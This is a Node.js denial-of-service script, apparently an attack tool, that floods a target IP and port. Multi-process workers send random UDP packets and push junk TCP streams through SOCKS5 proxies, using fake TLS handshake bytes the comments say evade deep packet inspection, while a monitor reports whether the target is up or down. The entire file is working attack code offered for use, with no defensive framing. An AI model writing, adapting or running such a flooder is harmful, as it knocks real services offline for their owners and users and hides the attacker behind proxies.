const net = require("net");
const dgram = require("dgram");
const cluster = require("cluster");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const target_ip = process.argv[2];
const target_port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[31m[BROAD-ATTACK]\x1b[0m 🔱 TITAN ENGINE V6 ENGAGED`);
    console.log(`\x1b[36m[INFO]\x1b[0m TARGET: ${target_ip} | PORT: ${target_port} | CORES: ${threads}\n`);

    let totalPackets = 0;

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        worker.on('message', (count) => { totalPackets += count; });
    }

    // --- LIVE BROADCAST MONITOR ---
    setInterval(() => {
        const s = net.connect(target_port, target_ip, () => {
            console.log(`\x1b[32m[ALIVE]\x1b[0m IP: ${target_ip} | PPS: \x1b[36m${totalPackets}\x1b[0m | STATUS: \x1b[1mUP\x1b[0m`);
            s.destroy();
        });
        s.on('error', () => {
            console.log(`\x1b[31m[DEAD]\x1b[0m IP: ${target_ip} | PPS: \x1b[36m${totalPackets}\x1b[0m | STATUS: \x1b[1mDOWN\x1b[0m`);
            s.destroy();
        });
        s.setTimeout(1000, () => s.destroy());
    }, 2000);

    setTimeout(() => { process.exit(); }, duration * 1000);
} else {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
    const udp = dgram.createSocket('udp4');

    // UDP Flooding Logic (Bandwidth Destroyer)
    function floodUDP() {
        const payload = crypto.randomBytes(1200); // Standard MTU Size
        udp.send(payload, 0, payload.length, target_port, target_ip, () => {
            process.send(1);
            setImmediate(floodUDP);
        });
    }

    // TCP Pipelining Logic (Resource Killer)
    function floodTCP() {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        const socket = net.connect(proxy[1], proxy[0]);
        
        socket.setNoDelay(true);
        socket.setKeepAlive(true, 120000);

        socket.on('connect', () => {
            socket.write(Buffer.from([0x05, 0x01, 0x00])); // SOCKS5 Handshake
        });

        socket.on('data', (data) => {
            if (data[0] === 0x05) {
                const conn = Buffer.concat([
                    Buffer.from([0x05, 0x01, 0x00, 0x03]),
                    Buffer.from([target_ip.length]),
                    Buffer.from(target_ip),
                    Buffer.from([(target_port >> 8) & 0xFF, target_port & 0xFF])
                ]);
                socket.write(conn);

                const pipe = () => {
                    if (!socket.writable) return;
                    // Multiplexed packets like CLOUDFLARE.js HTTP/2 streams
                    for(let i=0; i<100; i++) {
                        socket.write(crypto.randomBytes(512));
                        // Fake Handshake Signature to bypass DPI (Deep Packet Inspection)
                        socket.write(`\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03${crypto.randomBytes(32).toString('hex')}`);
                    }
                    process.send(100);
                    setImmediate(pipe);
                };
                pipe();
            }
        });

        socket.on('error', () => socket.destroy());
        setTimeout(() => socket.destroy(), 20000);
    }

    setInterval(floodTCP, 1);
    floodUDP();
}
